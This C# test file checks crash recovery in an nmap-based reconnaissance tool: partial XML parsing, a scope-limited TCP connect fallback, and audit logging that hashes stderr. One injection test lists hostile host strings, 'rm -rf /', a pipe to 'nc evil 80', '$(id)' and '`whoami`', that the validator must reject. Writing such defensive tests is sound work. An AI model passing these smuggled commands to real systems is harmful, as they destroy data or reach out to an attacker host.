using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using Drederick.Audit;
using Drederick.Recon;
using Drederick.Scope;
using Xunit;

namespace Drederick.Tests.Recon;

// --- htb-crash-resilient-nmap --- (GAP-053)
public class NmapCrashRecoveryTests
{
    private static AuditLog NewAudit() => new(Path.Combine(
        Path.GetTempPath(), $"drederick-nmap-crash-{Guid.NewGuid():N}.jsonl"));

    private static string FixturePath(string name, [CallerFilePath] string thisFile = "")
    {
        // tests/Drederick.Tests/Recon/NmapCrashRecoveryTests.cs ->
        // tests/fixtures/nmap/<name>
        var reconDir = Path.GetDirectoryName(thisFile)!;
        var testsDir = Path.GetDirectoryName(reconDir)!;
        var root = Path.GetDirectoryName(testsDir)!;
        return Path.Combine(root, "fixtures", "nmap", name);
    }

    [Fact]
    public void RecoversPartialXml_LastHostWellFormed_ReturnsFirstHostPorts()
    {
        var xml = File.ReadAllText(FixturePath("truncated-mid-host.xml"));
        var ports = NmapCrashRecovery.RecoverPartialXml(xml);
        Assert.Equal(2, ports.Count);
        Assert.Contains(ports, p => p.Port == 22 && p.Service == "ssh");
        Assert.Contains(ports, p => p.Port == 80 && p.Service == "http");
        // The truncated second host (10.10.10.6:445) must NOT appear: its
        // <host> block has no closing tag, so recovery rejects it.
        Assert.DoesNotContain(ports, p => p.Port == 445);
    }

    [Fact]
    public void RecoversPartialXml_ZeroComplete_ReturnsEmpty()
    {
        var xml = File.ReadAllText(FixturePath("truncated-no-host-close.xml"));
        var ports = NmapCrashRecovery.RecoverPartialXml(xml);
        Assert.Empty(ports);
    }

    [Fact]
    public void MalformedXml_NoSegfaultDetected_ReturnsError_NoFallback()
    {
        // Exit==0 + garbled XML: recovery returns empty, no TCP fallback.
        // This is the contract enforced by NmapTool.ScanAsync, exercised
        // here via the recovery primitive directly.
        var xml = File.ReadAllText(FixturePath("truncated-garbled.xml"));
        var ports = NmapCrashRecovery.RecoverPartialXml(xml);
        Assert.Empty(ports);
        // Fallback gating: exit==0 path in NmapTool never engages the
        // connect sweep — verified separately by ShouldAttemptConnectFallback
        // being a pure heuristic that the caller may ignore.
        Assert.True(NmapCrashRecovery.ShouldAttemptConnectFallback(
            TimeSpan.FromSeconds(11), stdoutBytes: 0));
        Assert.False(NmapCrashRecovery.ShouldAttemptConnectFallback(
            TimeSpan.FromSeconds(1), stdoutBytes: 0));
    }

    [Fact]
    public async Task ZeroHostRecovered_TriggersConnectFallback_FindsListenerPort()
    {
        var listener = new TcpListener(IPAddress.Loopback, 0);
        listener.Start();
        try
        {
            var port = ((IPEndPoint)listener.LocalEndpoint).Port;
            var scope = ScopeLoader.Parse("127.0.0.1");
            var open = await NmapCrashRecovery.TcpConnectFallbackAsync(
                scope,
                "127.0.0.1",
                new[] { port },
                connectTimeoutMs: 500);
            Assert.Contains(port, open);
        }
        finally
        {
            listener.Stop();
        }
    }

    [Fact]
    public async Task ConnectFallback_RespectsScope_OutOfScopeThrows()
    {
        var scope = ScopeLoader.Parse("10.10.10.5");
        await Assert.ThrowsAsync<ScopeException>(() =>
            NmapCrashRecovery.TcpConnectFallbackAsync(scope, "8.8.8.8", new[] { 80 }));
    }

    [Fact]
    public async Task Argv_Injection_InFallbackHostList_Rejected()
    {
        var scope = ScopeLoader.Parse("10.10.10.5");
        // Shell-metachar / space / pipe — must be refused even before the
        // scope check, because the shape regex is the first gate.
        foreach (var bad in new[] { "10.10.10.5; rm -rf /", "10.10.10.5 | nc evil 80",
                                    "$(id)", "`whoami`", "10.10.10.5/24" })
        {
            await Assert.ThrowsAsync<ArgumentException>(() =>
                NmapCrashRecovery.TcpConnectFallbackAsync(scope, bad, new[] { 80 }));
        }
    }

    [Fact]
    public void ExpandPortSpec_BoundedAndSafe()
    {
        Assert.Equal(new[] { 80, 443, 8000, 8001, 8002 },
            NmapCrashRecovery.ExpandPortSpec("80,443,8000-8002"));
        // "-" means "all ports" in nmap — caller is supposed to fall back
        // to top-N; the expander returns empty so callers don't accidentally
        // synthesise 65535 sockets.
        Assert.Empty(NmapCrashRecovery.ExpandPortSpec("-"));
        Assert.Empty(NmapCrashRecovery.ExpandPortSpec(""));
        Assert.Empty(NmapCrashRecovery.ExpandPortSpec(null));
    }

    [Fact]
    public void Tail_And_Sha256_BehaveAsDocumented()
    {
        Assert.Equal("xyz", NmapCrashRecovery.Tail("wwwxyz", 3));
        Assert.Equal("abc", NmapCrashRecovery.Tail("abc", 10));
        // SHA-256("") well-known digest.
        Assert.Equal(
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            NmapCrashRecovery.Sha256Hex(""));
    }

    [Fact]
    public void RecordCrash_DoesNotLeakStderr_OnlyHash()
    {
        var path = Path.Combine(Path.GetTempPath(),
            $"drederick-nmap-crash-rec-{Guid.NewGuid():N}.jsonl");
        using (var audit = new AuditLog(path))
        {
            NmapCrashRecovery.RecordCrash(audit, "10.10.10.5", -11,
                "SEGFAULT secret-shouldnt-leak-canary", recoveredHostCount: 0);
        }
        var contents = File.ReadAllText(path);
        Assert.Contains("nmap.crash", contents);
        Assert.Contains("stderr_tail_sha256", contents);
        // Canary string must not appear verbatim — only its hash.
        Assert.DoesNotContain("secret-shouldnt-leak-canary", contents);
        File.Delete(path);
    }

    [Fact]
    public void FallbackDisabled_NmapTool_ReturnsEmptyFinding()
    {
        // When --no-fallback-connect is wired through (allowFallbackConnect:
        // false), and nmap exits non-zero with unrecoverable output, the tool
        // populates Stderr instead of synthesising open ports. This test
        // exercises the constructor wiring without spawning a real nmap.
        var scope = ScopeLoader.Parse("10.10.10.5");
        using var audit = NewAudit();
        var tool = new NmapTool(scope, audit, nmapPath: "/bin/false",
            labMode: true, allowFallbackConnect: false);
        var task = tool.ScanAsync("10.10.10.5");
        var result = task.GetAwaiter().GetResult();
        Assert.NotEqual(0, result.ReturnCode);
        Assert.Empty(result.OpenPorts);
        Assert.NotNull(result.Stderr);
        Assert.Contains("recovery failed", result.Stderr!);
    }
}
// --- end htb-crash-resilient-nmap ---
